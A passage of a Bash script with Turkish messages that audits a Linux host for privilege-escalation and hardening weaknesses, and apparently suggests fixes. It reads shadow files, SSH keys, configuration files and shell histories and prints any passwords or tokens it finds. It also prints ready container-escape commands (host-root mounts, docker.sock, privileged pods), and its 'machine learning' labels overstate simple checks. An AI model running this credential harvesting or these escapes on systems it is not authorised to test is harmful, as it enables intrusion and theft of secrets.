    nginx_version=$(nginx -v 2>&1)
    echo -e "\e[00;32m[+] Nginx: $nginx_version\e[00m"
fi

# Veritabanları
if command -v mysql >/dev/null 2>&1; then
    mysql_version=$(mysql --version 2>/dev/null)
    echo -e "\e[00;32m[+] MySQL: $mysql_version\e[00m"
fi

if command -v psql >/dev/null 2>&1; then
    postgres_version=$(psql -V 2>/dev/null)
    echo -e "\e[00;32m[+] PostgreSQL: $postgres_version\e[00m"
fi
}

# Gelişmiş Dosya İzinleri Analizi
advanced_file_scanner() {
echo -e "\e[00;33m### GELİŞMİŞ DOSYA İZİNLERİ ANALİZİ ############\e[00m"

# Hassas dosya kategorileri
declare -A sensitive_categories=(
    ["password_files"]="/etc/passwd /etc/shadow /etc/master.passwd /etc/gshadow"
    ["config_files"]="/etc/apache2/apache2.conf /etc/nginx/nginx.conf /etc/mysql/my.cnf /etc/postgresql/main/postgresql.conf"
    ["ssh_keys"]="/root/.ssh/id_rsa /root/.ssh/id_dsa /home/*/.ssh/id_rsa /home/*/.ssh/id_dsa"
    ["cron_files"]="/etc/crontab /etc/cron.* /var/spool/cron/*"
    ["log_files"]="/var/log/auth.log /var/log/secure /var/log/messages /var/log/syslog"
)

echo -e "\e[00;31m[-] Kategori Bazlı Hassas Dosya Analizi:\e[00m"
for category in "${!sensitive_categories[@]}"; do
    files="${sensitive_categories[$category]}"
    echo -e "\e[00;32m[+] $category:\e[00m"
    for file_pattern in $files; do
        for file in $file_pattern; do
            if [ -r "$file" ]; then
                echo -e "\e[00;31m      -> OKUNABİLİR: $file\e[00m"
                log_finding "HIGH" "Okunabilir hassas dosya: $file"
                high_count=$((high_count + 1))
                risk_score=$((risk_score + 15))
            elif [ -e "$file" ]; then
                echo -e "\e[00;32m      -> Mevcut: $file\e[00m"
            fi
        done
    done
done

# Herkes tarafından yazılabilir dizinler
echo -e "\n\e[00;31m[-] Herkes Tarafından Yazılabilir Dizinler:\e[00m"
find / -type d -perm -002 2>/dev/null | grep -v -E "^/proc|^/sys|^/dev" | head -10 | while read dir; do
    echo -e "\e[00;33m[!] YAZILABİLİR DİZİN: $dir\e[00m"
    high_count=$((high_count + 1))
    risk_score=$((risk_score + 18))
done

# Yedek ve geçici dosyalar
echo -e "\n\e[00;31m[-] Yedek ve Geçici Dosyalar:\e[00m"
backup_patterns=("/home/*/*.bak" "/home/*/*.backup" "/home/*/*.old" "/home/*/*~" "/tmp/*.tmp" "/var/tmp/*.tmp")
for pattern in "${backup_patterns[@]}"; do
    for file in $pattern; do
        if [ -f "$file" ]; then
            echo -e "\e[00;32m[+] YEDEK DOSYA: $file\e[00m"
            medium_count=$((medium_count + 1))
            risk_score=$((risk_score + 8))
        fi
    done
done
}

# Gelişmiş Container Analizi
advanced_container_scanner() {
echo -e "\e[00;33m### GELİŞMİŞ CONTAINER VE SANALLAŞTIRMA ########\e[00m"

# Container kaçış teknikleri veritabanı
declare -A container_escape_techniques=(
    ["docker_mount"]="docker run -v /:/hostOS -it ubuntu bash"
    ["docker_sock"]="docker -v /var/run/docker.sock:/var/run/docker.sock -it ubuntu bash"
    ["docker_privileged"]="docker run --privileged -it ubuntu bash"
    ["k8s_mount"]="kubectl run privileged-pod --image=ubuntu -it --rm --privileged -- /bin/bash"
    ["lxc_attach"]="lxc-attach -n container_name"
)

echo -e "\e[00;31m[-] Container Kaçış Teknikleri Analizi:\e[00m"

# Docker analizi
if command -v docker >/dev/null 2>&1; then
    echo -e "\e[00;32m[+] Docker kurulu - kaçış teknikleri kontrol ediliyor...\e[00m"
    
    if groups | grep -q "docker"; then
        echo -e "\e[00;31m[!!!] KRİTİK: Docker grubu üyeliği!\e[00m"
        log_finding "CRITICAL" "Docker grubu üyeliği - container kaçışı mümkün"
        for technique in "${!container_escape_techniques[@]}"; do
            if [[ "$technique" == docker* ]]; then
                command="${container_escape_techniques[$technique]}"
                echo -e "\e[00;33m      -> Kaçış komutu: $command\e[00m"
            fi
        done
        critical_count=$((critical_count + 1))
        risk_score=$((risk_score + 35))
    fi
    
    # Docker versiyon zafiyetleri
    docker_version=$(docker --version 2>/dev/null | grep -o "[0-9]\+\.[0-9]\+\.[0-9]\+")
    if [ -n "$docker_version" ]; then
        echo -e "\e[00;32m[+] Docker versiyonu: $docker_version\e[00m"
        
        # Docker versiyon zafiyet kontrolü
        if [[ "$docker_version" == "1."* ]] && [[ "${docker_version#*.}" < "6.1" ]]; then
            echo -e "\e[00;31m[!] Eski Docker versiyonu - zafiyetli olabilir!\e[00m"
            high_count=$((high_count + 1))
            risk_score=$((risk_score + 20))
        fi
    fi
fi

# Kubernetes analizi
if command -v kubectl >/dev/null 2>&1; then
    echo -e "\e[00;32m[+] kubectl kurulu - kaçış teknikleri kontrol ediliyor...\e[00m"
    
    # Kubernetes yetki kontrolü
    if kubectl auth can-i create pods >/dev/null 2>&1; then
        echo -e "\e[00;31m[!!!] KRİTİK: Pod oluşturma izni var!\e[00m"
        log_finding "CRITICAL" "Kubernetes pod oluşturma izni"
        echo -e "\e[00;33m      -> Kaçış komutu: ${container_escape_techniques[k8s_mount]}\e[00m"
        critical_count=$((critical_count + 1))
        risk_score=$((risk_score + 30))
    fi
fi

# Container içinde mi kontrolü
container_indicators=(
    "/.dockerenv:Docker container"
    "/proc/1/cgroup:Docker/LXC cgroup"
    "/proc/self/mountinfo:Container mounts"
)

for indicator in "${container_indicators[@]}"; do
    file=$(echo "$indicator" | cut -d: -f1)
    desc=$(echo "$indicator" | cut -d: -f2)
    
    if [ -f "$file" ]; then
        if [[ "$file" == "/proc/1/cgroup" ]]; then
            if grep -q "docker\|lxc" "$file" 2>/dev/null; then
                echo -e "\e[00;31m[!] $desc tespit edildi!\e[00m"
                critical_count=$((critical_count + 1))
                risk_score=$((risk_score + 25))
            fi
        else
            echo -e "\e[00;31m[!] $desc tespit edildi!\e[00m"
            critical_count=$((critical_count + 1))
            risk_score=$((risk_score + 25))
        fi
    fi
done
}

# Gelişmiş Parola ve Kimlik Analizi
advanced_credential_scanner() {
echo -e "\e[00;33m### GELİŞMİŞ PAROLA VE KİMLİK ANALİZİ ##########\e[00m"

# Parola desenleri
declare -A password_patterns=(
    ["password"]="(password|passwd|pwd)[\s:=]+([^\s,;]+)"
    ["api_key"]="(api[_-]?key|apikey)[\s:=]+([^\s,;]+)"
    ["secret"]="(secret|token)[\s:=]+([^\s,;]+)"
    ["database"]="(db[_-]?password|database[_-]?pass)[\s:=]+([^\s,;]+)"
    ["ssh"]="(ssh[_-]?key|private[_-]?key)[\s:=]+([^\s,;]+)"
)

echo -e "\e[00;31m[-] Akıllı Parola Deseni Analizi:\e[00m"

# Konfigürasyon dosyalarını tara
config_locations=(
    "/etc/*.conf"
    "/etc/*.cfg"
    "/etc/*.config"
    "/home/*/.my.cnf"
    "/home/*/.pgpass"
    "/var/www/*config*.php"
    "/opt/*/config*"
    "/home/*/.aws/credentials"
    "/home/*/.docker/config.json"
)

for pattern in "${config_locations[@]}"; do
    for config_file in $pattern; do
        if [ -f "$config_file" ]; then
            echo -e "\e[00;32m[+] Konfigürasyon dosyası: $config_file\e[00m"
            
            for pattern_name in "${!password_patterns[@]}"; do
                regex="${password_patterns[$pattern_name]}"
                matches=$(grep -iE "$regex" "$config_file" 2>/dev/null | head -3)
                
                if [ -n "$matches" ]; then
                    echo -e "\e[00;31m      -> $pattern_name deseni bulundu!\e[00m"
                    log_finding "HIGH" "Parola deseni: $pattern_name | $config_file"
                    echo "$matches" | while read match; do
                        echo -e "\e[00;33m         * $match\e[00m"
                    done
                    high_count=$((high_count + 1))
                    risk_score=$((risk_score + 20))
                fi
            done
        fi
    done
done

# History dosyaları analizi
echo -e "\n\e[00;31m[-] History Dosyaları Analizi:\e[00m"
history_patterns=(
    "/home/*/.bash_history"
    "/home/*/.zsh_history"
    "/root/.bash_history"
    "/root/.zsh_history"
    "/home/*/.mysql_history"
    "/home/*/.psql_history"
)

for pattern in "${history_patterns[@]}"; do
    for history_file in $pattern; do
        if [ -r "$history_file" ]; then
            echo -e "\e[00;32m[+] Okunabilir history: $history_file\e[00m"
            
            # Hassas komutları ara
            sensitive_commands=$(grep -iE "(password|passwd|sudo|su|ssh|ftp|mysql|psql)" "$history_file" 2>/dev/null | tail -5)
            if [ -n "$sensitive_commands" ]; then
                echo -e "\e[00;33m      -> Hassas komutlar bulundu:\e[00m"
                echo "$sensitive_commands" | while read cmd; do
                    echo -e "\e[00;31m         * $cmd\e[00m"
                done
                medium_count=$((medium_count + 1))
                risk_score=$((risk_score + 12))
            fi
        fi
    done
done
}

# Paket yöneticisi ve zafiyet tarayıcısı
advanced_package_scanner() {
echo -e "\e[00;33m### PAKET VE GÜVENLİK TARAYICI ###################\e[00m"

if command_exists dpkg; then
  echo -e "\e[00;31m[-] dpkg paket listesi (kernel, openssl, sudo vs):\e[00m"
  dpkg -l 2>/dev/null | grep -E "kernel|openssl|sudo|ssh|apache|nginx|mysql|postgres|docker" | head -20
  echo
fi

if command_exists rpm; then
  echo -e "\e[00;31m[-] rpm paket listesi (kernel, openssl, sudo vs):\e[00m"
  rpm -qa 2>/dev/null | grep -E "kernel|openssl|sudo|ssh|apache|nginx|mysql|postgres|docker" | head -20
  echo
fi

if command_exists pacman; then
  echo -e "\e[00;31m[-] pacman paket bilgisi (kernel, openssl, sudo vs):\e[00m"
  pacman -Qi 2>/dev/null | grep -E "Name|Version" | grep -E "kernel|openssl|sudo|ssh|apache|nginx|mysql|postgres|docker" | head -20
  echo
fi

if command_exists zypper; then
  echo -e "\e[00;31m[-] zypper yüklü paketler:\e[00m"
  zypper se --installed-only 2>/dev/null | grep -E "kernel|openssl|sudo|ssh|apache|nginx|mysql|postgres|docker" | head -20
  echo
fi

if command_exists apt-cache; then
  echo -e "\e[00;31m[-] apt-cache politika kontrolü:\e[00m"
  apt-cache policy sudo openssh-server openssh-client apache2 nginx mysql-server postgresql docker-ce 2>/dev/null | head -40
  echo
fi
}

# Sistem yapılandırması ve sertleştirme taraması
advanced_system_settings() {
echo -e "\e[00;33m### SİSTEM YAPILANDIRMA VE SERTLEŞTİRME #########\e[00m"

for sys in /proc/sys/net/ipv4/ip_forward /proc/sys/net/ipv4/conf/all/accept_redirects /proc/sys/net/ipv4/conf/all/send_redirects /proc/sys/net/ipv4/conf/all/rp_filter /proc/sys/kernel/sysrq /proc/sys/kernel/randomize_va_space; do
  if [ -r "$sys" ]; then
    echo -e "\e[00;31m[-] $(basename "$sys") değeri:\e[00m $(cat "$sys" 2>/dev/null)"
  fi
done

echo -e "\n\e[00;31m[-] Audit durumu:\e[00m"
if command_exists auditctl; then
  auditctl -s 2>/dev/null | head -20
else
  echo -e "\e[00;33m[!] auditctl bulunamadı\e[00m"
fi

echo -e "\n\e[00;31m[-] Shell ortamı ve güvenlik ayarları:\e[00m"
if [ -r /etc/profile ]; then ls -l /etc/profile; fi
if [ -r /etc/bash.bashrc ]; then ls -l /etc/bash.bashrc; fi
if [ -d /etc/profile.d ]; then find /etc/profile.d -type f -maxdepth 1 -exec ls -l {} \; 2>/dev/null | head -20; fi
if [ -r /etc/ssh/sshd_config ]; then ls -l /etc/ssh/sshd_config; fi

echo -e "\n\e[00;31m[-] /etc içinde yazılabilir dosya kontrolü:\e[00m"
find /etc -maxdepth 2 -type f \( -perm -o+w -o -perm -g+w \) 2>/dev/null | head -20

echo -e "\n\e[00;31m[-] PATH değişkeni kontrolü:\e[00m"
IFS=":" read -r -a path_dirs <<< "$PATH"
for dir in "${path_dirs[@]}"; do
  if [ -n "$dir" ] && [ -d "$dir" ]; then
    echo -e "   $dir -> $(ls -ld "$dir" 2>/dev/null)"
  fi
done
}

# ULTRA DERİN TARAMA FONKSİYONLARI
pam_audit() {
    echo -e "\e[00;31m[-] PAM (Pluggable Authentication Modules) Güvenlik Analizi:\e[00m"
    
    if [ -f /etc/pam.conf ]; then
        echo -e "\e[00;33m   → /etc/pam.conf bulundu (eski format)\e[00m"
        grep -v "^#" /etc/pam.conf | head -10
        risk_score=$((risk_score + 5))
        medium_count=$((medium_count + 1))
        log_finding "ORTA" "PAM eski format kullanımı"
    fi
    
    if [ -d /etc/pam.d ]; then
        pam_files=$(ls -l /etc/pam.d/ 2>/dev/null | grep -c "^-")
        echo -e "\e[00;33m   → $pam_files adet PAM yapılandırma dosyası\e[00m"
        
        if grep -r "pam_permitopen\|pam_exec\|pam_script" /etc/pam.d 2>/dev/null | grep -qv "^#"; then
            echo -e "\e[00;31m   [!] Özel PAM modülleri etkinleştirilmiş\e[00m"
            grep -r "pam_permitopen\|pam_exec\|pam_script" /etc/pam.d 2>/dev/null | grep -v "^#"
            risk_score=$((risk_score + 10))
            high_count=$((high_count + 1))
            log_finding "YÜKSEK" "Özel PAM modülleri tespit edildi"
        fi
    fi
}

sudo_deep_audit() {
    echo -e "\e[00;31m[-] SUDO Yapılandırması Derin Analizi:\e[00m"
    
    if [ ! -f /etc/sudoers ]; then
        echo -e "\e[00;32m   ✓ /etc/sudoers bulunamadı\e[00m"
        return
    fi
    
    echo -e "\e[00;33m   → NOPASSWD kullanıcıları:\e[00m"
    grep "NOPASSWD" /etc/sudoers 2>/dev/null
    if grep -q "NOPASSWD" /etc/sudoers 2>/dev/null; then
        risk_score=$((risk_score + 15))
        high_count=$((high_count + 1))
        log_finding "YÜKSEK" "NOPASSWD sudo yapılandırması bulundu"
    fi
    
    echo -e "\e[00;33m   → ALL=(ALL) izinleri:\e[00m"
    grep "ALL=(ALL)" /etc/sudoers 2>/dev/null
    
    echo -e "\e[00;33m   → /bin/sh, /bin/bash erişim izinleri:\e[00m"
    grep "/bin/*sh\|/bin/bash" /etc/sudoers 2>/dev/null
    
    echo -e "\e[00;33m   → Sudoers dosyası izinleri:\e[00m"
    ls -l /etc/sudoers 2>/dev/null
}

ssh_security_audit() {
    echo -e "\e[00;31m[-] SSH Konfigürasyonu Güvenlik Denetimi:\e[00m"
    
    if [ ! -f /etc/ssh/sshd_config ]; then
        echo -e "\e[00;32m   ✓ SSH sunucusu yüklü değil\e[00m"
        return
    fi
    
    local ssh_risks=0
    
    if grep -q "^PermitRootLogin yes" /etc/ssh/sshd_config 2>/dev/null; then
        echo -e "\e[00;31m   [!] ROOT SSH GİRİŞİ ETKİNLEŞTİRİLMİŞ\e[00m"
        risk_score=$((risk_score + 20))
        high_count=$((high_count + 1))
        ssh_risks=$((ssh_risks + 1))
        log_finding "YÜKSEK" "SSH root girişi etkinleştirilmiş"
    fi
    
    if grep -q "^PasswordAuthentication yes" /etc/ssh/sshd_config 2>/dev/null; then
        echo -e "\e[00;33m   → Parola doğrulaması etkin (bir yanlış yapılandırma olabilir)\e[00m"
    fi
    
    if ! grep -q "^PubkeyAuthentication yes" /etc/ssh/sshd_config 2>/dev/null; then
        echo -e "\e[00;33m   → SSH anahtarı doğrulaması devre dışı\e[00m"
        risk_score=$((risk_score + 10))
        medium_count=$((medium_count + 1))
        ssh_risks=$((ssh_risks + 1))
    fi
    
    if grep -q "^AllowRootLogin yes" /etc/ssh/sshd_config 2>/dev/null || grep -q "^GatewayPorts yes" /etc/ssh/sshd_config 2>/dev/null; then
        echo -e "\e[00;31m   [!] SSH ağ geçidi açık\e[00m"
        risk_score=$((risk_score + 10))
    fi
    
    if [ $ssh_risks -gt 0 ]; then
        log_finding "BİLGİ" "SSH yapılandırmasında $ssh_risks güvenlik sorunu"
    fi
}

sysctl_security_audit() {
    echo -e "\e[00;31m[-] Sysctl Güvenlik Parametreleri Denetimi:\e[00m"
    
    local sysctl_issues=0
    
    declare -A required_params=(
        ["kernel.yama.ptrace_scope"]="2"
        ["net.ipv4.conf.all.send_redirects"]="0"
        ["net.ipv4.icmp_echo_ignore_all"]="0"
        ["net.ipv4.ip_forward"]="0"
        ["net.ipv6.conf.all.disable_ipv6"]="0"
    )
    
    for param in "${!required_params[@]}"; do
        current=$(sysctl "$param" 2>/dev/null | awk '{print $NF}')
        expected="${required_params[$param]}"
        
        if [ "$current" != "$expected" ]; then
            echo -e "\e[00;33m   → $param = $current (önerilen: $expected)\e[00m"
            sysctl_issues=$((sysctl_issues + 1))
        fi
    done
    
    if [ $sysctl_issues -gt 0 ]; then
        risk_score=$((risk_score + 8))
        medium_count=$((medium_count + 1))
        log_finding "ORTA" "Kernel parametreleri güvenlikli değil ($sysctl_issues sorun)"
    fi
}

mount_points_audit() {
    echo -e "\e[00;31m[-] Dosya Sistemi Bağlama Seçenekleri Denetimi:\e[00m"
    
    echo -e "\e[00;33m   → Yazılabilir bağlama noktaları:\e[00m"
    mount | grep -E "rw.*user" | while read line; do
        echo "   $line"
        risk_score=$((risk_score + 5))
        medium_count=$((medium_count + 1))
    done
    
    echo -e "\e[00;33m   → noexec seçeneği olmayan /tmp:\e[00m"
    if ! mount | grep "/tmp" | grep -q "noexec"; then
        echo -e "\e[00;31m   [!] /tmp'de yürütülebilir dosyalar çalışabilir\e[00m"
        risk_score=$((risk_score + 8))
        medium_count=$((medium_count + 1))
        log_finding "ORTA" "/tmp noexec seçeneği olmadan bağlanmış"
    fi
    
    echo -e "\e[00;33m   → dev seçeneği /tmp/var/tmp'de:\e[00m"
    if mount | grep -E "(/tmp|/var/tmp)" | grep -q "dev"; then
        echo -e "\e[00;31m   [!] /tmp /var/tmp'de cihaz dosyaları oluşturulabilir\e[00m"
        risk_score=$((risk_score + 10))
        high_count=$((high_count + 1))
        log_finding "YÜKSEK" "Geçici dizinler dev seçeneği ile bağlı"
    fi
}

library_injection_audit() {
    echo -e "\e[00;31m[-] Kütüphane Enjeksiyonu Vektörleri:\e[00m"
    
    echo -e "\e[00;33m   → LD_PRELOAD ortam değişkeni:\e[00m"
    if [ -n "$LD_PRELOAD" ]; then
        echo -e "\e[00;31m   [!] LD_PRELOAD ayarlanmış: $LD_PRELOAD\e[00m"
        risk_score=$((risk_score + 15))
        high_count=$((high_count + 1))
        log_finding "YÜKSEK" "LD_PRELOAD kütüphane enjeksiyonu etkin"
    fi
    
    echo -e "\e[00;33m   → LD_LIBRARY_PATH kontrolleri:\e[00m"
    if [ -n "$LD_LIBRARY_PATH" ]; then
        echo -e "\e[00;33m   → LD_LIBRARY_PATH: $LD_LIBRARY_PATH\e[00m"
        if [[ "$LD_LIBRARY_PATH" == *"::"* ]] || [[ "$LD_LIBRARY_PATH" == ":"* ]] || [[ "$LD_LIBRARY_PATH" == *":"* ]]; then
            echo -e "\e[00;31m   [!] Boş LD_LIBRARY_PATH dizini (mevcut dizin)\e[00m"
            risk_score=$((risk_score + 12))
            high_count=$((high_count + 1))
        fi
    fi
    
    echo -e "\e[00;33m   → RUNPATH'te . veya yazılabilir dizin:\e[00m"
    find /usr/bin /usr/local/bin -type f 2>/dev/null | head -10 | while read binary; do
        if ldd "$binary" 2>/dev/null | grep -q 'not found'; then
            echo "   → Eksik bağımlılık: $binary"
        fi
    done
}

daemon_privileges_audit() {
    echo -e "\e[00;31m[-] Root Daemon'ları ve Yetkileri Denetimi:\e[00m"
    
    echo -e "\e[00;33m   → Root tarafından çalışan önemli servisler:\e[00m"
    ps aux | grep "^root" | grep -v grep | awk '{print $11, $12}' | sort -u | head -15
    
    echo -e "\e[00;33m   → Ubuntu/Debian SUID'lı önemli programlar:\e[00m"
    find /usr/bin /usr/sbin -perm -4000 -user root 2>/dev/null | while read binary; do
        basename "$binary"
    done | sort -u
}

core_dump_audit() {
    echo -e "\e[00;31m[-] Memory Dump ve Core Dump Koruma Denetimi:\e[00m"
    
    echo -e "\e[00;33m   → Core dump sınırı:\e[00m"
    ulimit -c
    
    if [ "$(ulimit -c)" != "0" ]; then
        echo -e "\e[00;31m   [!] Core dump etkinleştirilmiş\e[00m"
        risk_score=$((risk_score + 10))
        medium_count=$((medium_count + 1))
        log_finding "ORTA" "Core dump etkinleştirilmiş bellek sızıntısı riski"
    fi
    
    echo -e "\e[00;33m   → ASLR (Address Space Layout Randomization):\e[00m"
    if [ -f /proc/sys/kernel/randomize_va_space ]; then
        aslr_val=$(cat /proc/sys/kernel/randomize_va_space)
        echo -e "   → ASLR seviyesi: $aslr_val"
        if [ "$aslr_val" = "0" ]; then
            echo -e "\e[00;31m   [!] ASLR devre dışı\e[00m"
            risk_score=$((risk_score + 15))
            high_count=$((high_count + 1))
            log_finding "YÜKSEK" "ASLR (Address Space Layout Randomization) devre dışı"
        fi
    fi
}

mac_audit() {
    echo -e "\e[00;31m[-] MAC (Mandatory Access Control) Sistemleri Denetimi:\e[00m"
    
    if command_exists getenforce; then
        selinux_status=$(getenforce)
        echo -e "\e[00;33m   → SELinux durumu: $selinux_status\e[00m"
        if [ "$selinux_status" = "Disabled" ]; then
            echo -e "\e[00;31m   [!] SELinux devre dışı\e[00m"
            risk_score=$((risk_score + 10))
            medium_count=$((medium_count + 1))
            log_finding "ORTA" "SELinux güvenlik modülü devre dışı"
        fi
    fi
    
    if command_exists aa-status; then
        echo -e "\e[00;33m   → AppArmor modu:\e[00m"
        aa-status 2>/dev/null | head -5
    fi
    
    if [ ! -f /sys/kernel/security/apparmor/enabled ] && ! command_exists getenforce; then
        echo -e "\e[00;33m   → Zorunlu erişim kontrolü yüklü değil\e[00m"
        risk_score=$((risk_score + 5))
        medium_count=$((medium_count + 1))
    fi
}

firewall_audit() {
    echo -e "\e[00;31m[-] Firewall Kuralları ve Ağ Güvenliği:\e[00m"
    
    if command_exists ufw; then
        echo -e "\e[00;33m   → UFW (Uncomplicated Firewall) durumu:\e[00m"
        ufw status 2>/dev/null || echo "   → UFW devre dışı"
    fi
    
    if command_exists iptables; then
        echo -e "\e[00;33m   → iptables kuralları:\e[00m"
        iptables -L -n 2>/dev/null | head -20
    fi
    
    if [ -f /etc/sysconfig/iptables ]; then
        echo -e "\e[00;33m   → Firewall kuralı dosyası var\e[00m"
    else
        echo -e "\e[00;31m   [!] Firewall kuralları bulunamadı\e[00m"
        risk_score=$((risk_score + 8))
        medium_count=$((medium_count + 1))
        log_finding "ORTA" "Firewall kuralları yapılandırılmamış"
    fi
}

# ================================================
# ML TABANLı RİSK TAHMİN SİSTEMİ VE CVE ANALİZİ
# ================================================

ml_risk_predictor() {
    echo -e "\e[00;34m[ML] Makine Öğrenmesi Tabanlı Risk Tahmini...\e[00m"
    
    local ml_risk=0
    local ml_factors=""
    
    # Sysctl anomali analizi
    if ! grep -q "net.ipv4.ip_forward = 0" /etc/sysctl.conf 2>/dev/null; then
        ((ml_risk += 8))
        ml_factors="${ml_factors}\n  - IP yönlendirmesi etkinleştirilebilir"
    fi
    
    # PAM modülü anomalisi
    local pam_anomaly=$(find /etc/pam.d -type f 2>/dev/null | wc -l)
    if [ "$pam_anomaly" -lt 5 ]; then
        ((ml_risk += 5))
        ml_factors="${ml_factors}\n  - PAM yapılandırması eksik"
    fi
    
    # SSH key entropy
    if [ -f /root/.ssh/id_rsa ]; then
        local key_bits=$(ssh-keygen -l -f /root/.ssh/id_rsa 2>/dev/null | awk '{print $1}')
        if [ "$key_bits" -lt 2048 ]; then
            ((ml_risk += 12))
            ml_factors="${ml_factors}\n  - Zayıf SSH anahtarı"
        fi
    fi
    
    echo -e "\e[00;33mML Risk Skoru: +$ml_risk\e[00m"
}

cve_vulnerability_scanner() {
    echo -e "\e[00;34m[CVE] Bilinen Açıklıklar Taraması...\e[00m"
    
    local cve_risk=0
    
    # OpenSSL versiyonu
    local openssl_version=$(openssl version 2>/dev/null | awk '{print $2}')
    if [[ "$openssl_version" < "1.1.1" ]]; then
        ((cve_risk += 15))
        echo -e "\e[00;31m  ✗ Eski OpenSSL: $openssl_version\e[00m"
    fi
    
    # Kernel versiyonu
    local kernel_version=$(uname -r | cut -d. -f1-2)
    if [[ "$kernel_version" < "5.4" ]]; then
        ((cve_risk += 20))
        echo -e "\e[00;31m  ✗ Eski kernel: $kernel_version\e[00m"
    fi
    
    echo -e "\e[00;33mCVE Risk: +$cve_risk\e[00m"
}

behavioral_anomaly_detection() {
    echo -e "\e[00;34m[DAVRANIM] Davranış Anomali Tespiti...\e[00m"
    
    local anomaly_score=0
    
    # Şüpheli LD_PRELOAD
    if [ -n "$LD_PRELOAD" ]; then
        ((anomaly_score += 20))
        echo -e "\e[00;31m  ✗ Şüpheli LD_PRELOAD: $LD_PRELOAD\e[00m"
    fi
    
    # Zombi işlem kontrolü
    local zombie_procs=$(ps aux 2>/dev/null | grep -c " <defunct>" || echo "0")
    if [ "$zombie_procs" -gt 5 ]; then
        ((anomaly_score += 8))
        echo -e "\e[00;33m  ⚠️ Zombi işlemler: $zombie_procs\e[00m"
    fi
    
    echo -e "\e[00;33mAnomali Skoru: +$anomaly_score\e[00m"
}

advanced_encryption_analysis() {
    echo -e "\e[00;34m[KRİPTOGRAFİ] Şifreleme Analizi...\e[00m"
    
    local crypto_risk=0
    
    # TLS/SSL kontrolü
    if [ -f /etc/ssl/openssl.cnf ]; then
        local weak_ssl=$(grep -c "TLSv1\|SSLv3" /etc/ssl/openssl.cnf 2>/dev/null || echo "0")
        if [ "$weak_ssl" -gt 0 ]; then
            ((crypto_risk += 20))
            echo -e "\e[00;31m  ✗ Zayıf TLS/SSL sürümleri\e[00m"
        fi
    fi
    
    echo -e "\e[00;33mKripto Risk: +$crypto_risk\e[00m"
}

supply_chain_risk_assessment() {
    echo -e "\e[00;34m[TEDARİK] Tedarik Zinciri Risk Analizi...\e[00m"
    
    local supply_risk=0
    
    # Tainted Kernel
    if [ -f /proc/sys/kernel/tainted ]; then
        local tainted=$(cat /proc/sys/kernel/tainted)
        if [ "$tainted" != "0" ]; then
            ((supply_risk += 12))
            echo -e "\e[00;33m  ⚠️ Kernel tainted: $tainted\e[00m"
        fi
    fi
    
    echo -e "\e[00;33mTedarik Zinciri Riski: +$supply_risk\e[00m"
}

zero_day_heuristics() {
    echo -e "\e[00;34m[SIFIR-GÜN] Sıfır-Gün Heuristikleri...\e[00m"
    
    local zero_day_score=0
    
    # Kernel errors
    if [ -f /var/log/kern.log ]; then
        local kernel_errors=$(grep -i "BUG\|Oops\|panic" /var/log/kern.log 2>/dev/null | wc -l || echo "0")
        if [ "$kernel_errors" -gt 3 ]; then
            ((zero_day_score += 20))
            echo -e "\e[00;31m  ✗ Kernel hataları: $kernel_errors\e[00m"
        fi
    fi
    
    echo -e "\e[00;33mSıfır-Gün Risk: +$zero_day_score\e[00m"
}

smart_posture_advisor() {
    echo -e "\e[00;35m[AKILLI DANIŞMAN] Sistem güvenlik postürü değerlendiriliyor...\e[00m"
    
    local posture="NORMAL"
    local fast_action="Sistemi izole edin ve kritik bulguları önceliklendirin."
    local has_ld_preload=0
    local has_writable_system=0
    local ld_preload_note=""
    local writable_note=""
    
    if [ -f /etc/ld.so.preload ]; then
        has_ld_preload=1
        ld_preload_note="   • /etc/ld.so.preload bulundu, kullanıcı tarafından yüklenen shared kütüphaneler dikkatle incelenmeli."
    fi
    
    local writable_count=$(find /usr/bin /usr/sbin /bin /sbin -type f -perm -o+w 2>/dev/null | wc -l || echo "0")
    if [ "$writable_count" -gt 0 ]; then
        has_writable_system=1
        writable_note="   • Yazılabilir sistem binary'leri tespit edildi: $writable_count. Bu, yetki yükseltme için acil risk oluşturur."
    fi
    
    if [ "$risk_level" = "KRİTİK" ] || [ "$critical_count" -gt 0 ]; then
        posture="ÇOK KRİTİK"
    elif [ "$risk_level" = "ÇOK YÜKSEK" ] || [ "$high_count" -gt 2 ]; then
        posture="KÖTÜ"
    elif [ "$risk_level" = "YÜKSEK" ]; then
        posture="ENDİŞE VERİCİ"
    fi
    
    echo -e "   • Sistem durumu: $posture"
    echo -e "   • Hızlı aksiyon: $fast_action"
    if [ "$has_ld_preload" -eq 1 ]; then
        echo -e "${ld_preload_note}"
    fi
    if [ "$has_writable_system" -eq 1 ]; then
        echo -e "${writable_note}"
    fi
    log_finding "ÖZET" "Sistem postürü: $posture"
}

improved_remediation_engine() {
    echo -e "\e[00;35m[AKILLI ONARIM] Context-aware düzeltme önerileri...\e[00m"
    
    if [ -f /etc/ssh/sshd_config ] && ! grep -Eq "^[[:space:]]*PermitRootLogin[[:space:]]+no" /etc/ssh/sshd_config 2>/dev/null; then
        echo -e "\e[00;36m  ▸ SSH root girişini kapatın: sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config\e[00m"
    fi
    
    if ! systemctl is-active --quiet ufw 2>/dev/null && command -v ufw >/dev/null 2>&1; then
        echo -e "\e[00;36m  ▸ Güvenlik duvarını açın: ufw default deny incoming && ufw default allow outgoing && ufw enable\e[00m"
    fi
    
    if ! command -v fail2ban-server >/dev/null 2>&1; then
        echo -e "\e[00;36m  ▸ Fail2ban olay yönetimi için kurun: apt install fail2ban && systemctl enable fail2ban\e[00m"
    fi
    
    if [ -f /etc/ld.so.preload ]; then
        echo -e "\e[00;36m  ▸ /etc/ld.so.preload içeriğini kontrol edin ve yalnızca güvenilir kütüphaneleri bırakın\e[00m"
    fi
    
    local writable_system=$(find /usr/bin /usr/sbin /bin /sbin -type f -perm -o+w 2>/dev/null | wc -l || echo "0")
    if [ "$writable_system" -gt 0 ]; then
        echo -e "\e[00;36m  ▸ Yazılabilir sistem dosyalarını kapatın: find /usr/bin /usr/sbin /bin /sbin -type f -perm -o+w -exec chmod o-w {} \; 2>/dev/null\e[00m"
    fi
    
    if [ -n "$LD_PRELOAD" ]; then
        echo -e "\e[00;36m  ▸ Mevcut LD_PRELOAD değişkenini temizleyin: unset LD_PRELOAD\e[00m"
    fi
}

intelligent_remediation_engine() {
    improved_remediation_engine
}

baseline_system_comparison() {
    echo -e "\e[00;34m[KARŞILAŞTIRMA] Sistem Başlangıç Belgesi...\e[00m"
    
    local baseline_file="/var/log/system_baseline_$(date +%Y%m%d_%H%M%S).txt"
    if [ -w /var/log ]; then
        {
